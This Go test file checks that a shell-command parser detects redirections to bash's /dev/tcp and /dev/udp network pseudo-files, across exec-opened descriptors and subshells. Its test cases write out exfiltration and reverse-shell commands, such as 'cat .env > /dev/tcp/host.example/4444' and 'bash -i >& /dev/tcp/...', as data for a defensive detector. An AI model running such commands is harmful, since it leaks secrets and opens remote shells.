package shellcmd

import (
	"reflect"
	"testing"
)

// A command's redirections to bash's network pseudo-files are reported with the command, in the
// direction it uses them, also through a descriptor an earlier exec opened. The same path as a
// word of a command is not a redirection.
func TestSocketRedirects(t *testing.T) {
	for _, tc := range []struct {
		command string
		// want lists, per command that has any, "<name>:<op>:<path>" for each redirection.
		want []string
	}{
		{"cat .env > /dev/tcp/host.example/4444", []string{"cat:write:/dev/tcp/host.example/4444"}},
		{"cat .env >/dev/udp/10.0.0.1/53", []string{"cat:write:/dev/udp/10.0.0.1/53"}},
		{"cat < /dev/tcp/host.example/80", []string{"cat:read:/dev/tcp/host.example/80"}},
		{`tar czf - src > "/dev/tcp/$HOST/$PORT"`, []string{"tar:write:/dev/tcp/$HOST/$PORT"}},
		{"bash -i >& /dev/tcp/host.example/4444 0>&1", []string{"bash:write:/dev/tcp/host.example/4444", "bash:read:/dev/tcp/host.example/4444"}},
		// A duplication within one command copies what its earlier redirections opened.
		{"exec 3<>/dev/tcp/host.example/4444 >&3; cat .env", []string{
			"exec:readwrite:/dev/tcp/host.example/4444", "exec:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
		{"cat .env 3>/dev/tcp/host.example/4444 >&3", []string{"cat:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
		// A compound's duplication of a descriptor an exec opened.
		{"exec 3<>/dev/tcp/host.example/4444; { cat .env; } >&3", []string{
			"exec:readwrite:/dev/tcp/host.example/4444", "{}:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
		{"exec 3<>/dev/tcp/host.example/4444; (cat .env) >&3", []string{
			"exec:readwrite:/dev/tcp/host.example/4444", "{}:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
		// A descriptor an exec opened, used by a later command, in the direction it uses it.
		{"exec 3<>/dev/tcp/host.example/4444; cat .env >&3; cat <&3", []string{
			"exec:readwrite:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444", "cat:read:/dev/tcp/host.example/4444"}},
		{"exec 5>/dev/tcp/host.example/4444\necho hi >&5\nexec 5>&-\necho bye >&5", []string{
			"exec:write:/dev/tcp/host.example/4444", "echo:write:/dev/tcp/host.example/4444"}},
		// Another descriptor, a file, a device, and the path as a word are not socket redirections.
		{"exec 3<>/dev/tcp/host.example/4444; echo hi >&2", []string{"exec:readwrite:/dev/tcp/host.example/4444"}},
		{"cat .env > /dev/null 2>&1", nil},
		{"cat .env > /tmp/dev/tcp/x", nil},
		{"echo 'cat x > /dev/tcp/host.example/4444' >> notes.md", nil},
		{"git commit -m 'send to /dev/tcp/host/1'", nil},
		// A descriptor opened in a subshell or a substitution does not reach the commands after it.
		{"(exec 3<>/dev/tcp/host.example/4444); cat .env >&3", []string{"exec:readwrite:/dev/tcp/host.example/4444"}},
		// A subshell uses what the shell that started it has open, and what it opens itself.
		{"exec 3<>/dev/tcp/host.example/4444; (cat .env >&3)", []string{"exec:readwrite:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
		{"(exec 3>/dev/tcp/host.example/4444; cat .env >&3)", []string{"exec:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
		{"(exec 3<>/dev/tcp/host.example/4444; (cat .env >&3))", []string{"exec:readwrite:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
		{`(exec 3>/dev/tcp/host.example/4444; echo "$(cat .env >&3)")`, []string{"exec:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
		{"(exec 3>/dev/tcp/host.example/4444); (cat .env >&3)", []string{"exec:write:/dev/tcp/host.example/4444"}},
		// Closing it in an inner subshell closes it there only.
		{"(exec 3>/dev/tcp/host.example/4444; (exec 3>&-; cat a >&3); cat b >&3)", []string{"exec:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
		// A command's standard output goes where its compound statement sends it, or where a bare
		// exec left it; a pipeline inside takes it from all but its last stage.
		{"{ cat .env; } > /dev/tcp/host.example/4444", []string{"{}:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
		{"(cat .env) > /dev/tcp/host.example/4444", []string{"{}:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
		{"{ cat .env | base64; } > /dev/tcp/host.example/4444", []string{"{}:write:/dev/tcp/host.example/4444", "base64:write:/dev/tcp/host.example/4444"}},
		{"{ cat .env > /tmp/x; } > /dev/tcp/host.example/4444", []string{"{}:write:/dev/tcp/host.example/4444"}},
		{"exec >/dev/tcp/host.example/4444; cat .env", []string{"exec:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
		{"exec >/dev/tcp/host.example/4444; cat .env | base64", []string{"exec:write:/dev/tcp/host.example/4444", "base64:write:/dev/tcp/host.example/4444"}},
		{"exec 0</dev/tcp/host.example/4444; sh", []string{"exec:read:/dev/tcp/host.example/4444", "sh:read:/dev/tcp/host.example/4444"}},
		{`exec >/dev/tcp/host.example/4444; echo "$(cat .env)"`, []string{"exec:write:/dev/tcp/host.example/4444", "echo:write:/dev/tcp/host.example/4444"}},
	} {
		commands, err := Parse(tc.command)
		if err != nil {
			t.Fatalf("%s: %v", tc.command, err)
		}
		var got []string
		for i, redirects := range SocketRedirects(commands) {
			for _, r := range redirects {
				name := "{}"
				if len(commands[i].Argv) > 0 {
					name = commands[i].Argv[0].Text
				}
				got = append(got, name+":"+string(r.Op)+":"+r.Path)
			}
		}
		if !reflect.DeepEqual(got, tc.want) {
			t.Errorf("%s:\n  got  %q\n  want %q", tc.command, got, tc.want)
		}
	}
}
